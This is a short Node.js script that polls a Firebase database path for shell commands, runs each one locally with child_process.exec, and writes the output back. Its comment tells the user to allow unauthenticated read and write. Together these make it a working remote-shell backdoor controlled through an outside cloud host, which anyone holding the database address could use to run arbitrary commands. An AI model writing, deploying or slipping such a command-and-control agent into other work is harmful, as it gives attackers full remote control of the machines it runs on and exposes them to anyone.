const firebase = require("firebase");
const exec = require('child_process').exec;
const config = require('./config/fireBase.js'); ///////firebase config object take it from console take care of the data base role you must allow unAUTH read and write
firebase.initializeApp(config);
const cmd = firebase.database().ref('userID/cmd');
cmd.on('value', (snapshot)=> {
  snapshot.forEach((val)=>{
      responce({id:val.key,cmd:val.val().cmd,done:val.val().done},(e,r)=>{
          if(e) throw e
          console.log(r)
      })
  })
});


const responce = (cmd,cb) => {
    if(!cmd.done){
        DO(cmd.cmd,(err,res)=>{
            if (err) res = err
            firebase.database().ref('userID/cmd/' + cmd.id).update({
                result : res,
                done : true
            });
        })
    }
}

const DO = (cmd,cb)=>{
    exec(cmd, (error, stdout, stderr) => {
    if (error) {
        cb(`exec error: ${error}`,null);
        return;
    }
    if(stderr){
        cb(`stderr: ${stderr}`,null)
        return;
    }
    cb(null,`stdout: ${stdout}`)
    return;
    });
}
